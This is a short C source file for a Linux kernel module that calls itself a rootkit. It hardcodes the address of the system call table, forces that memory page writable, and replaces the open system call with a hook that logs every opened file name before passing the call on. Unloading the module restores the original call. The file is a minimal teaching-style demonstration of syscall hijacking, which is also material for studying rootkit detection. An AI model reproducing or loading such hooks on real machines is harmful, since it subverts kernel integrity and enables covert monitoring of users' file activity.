#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("wanglei<sa615256@mail.ustc.edu.cn>");
MODULE_AUTHOR("Michal Winiarski<t3hkn0r@gmail.com>");
static void **sys_call_table;

asmlinkage int (*original_call) (const char*, int, int);
static void set_page_rw( void * addr)
{
	unsigned int level;
        pte_t *pte = lookup_address((unsigned long)addr, &level);

        if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
}
asmlinkage int our_sys_open(const char* file, int flags, int mode)
{
   printk("%s was opened\n",file);
   return original_call(file, flags, mode);
}

int init_module()
{   
    printk("rootkit module loaded!");
    // sys_call_table address in System.map
    sys_call_table = (void*)0xc128c110;
    //(void**)
    original_call = sys_call_table[__NR_open];
    set_page_rw(sys_call_table);
   // Hook: if not set page rw ,may crashes here
    sys_call_table[__NR_open] = our_sys_open;
    return 0;
}

void cleanup_module()
{
   // Restore the original call
   printk("rootkit module was remmoved!");
   sys_call_table[__NR_open] = original_call;
}
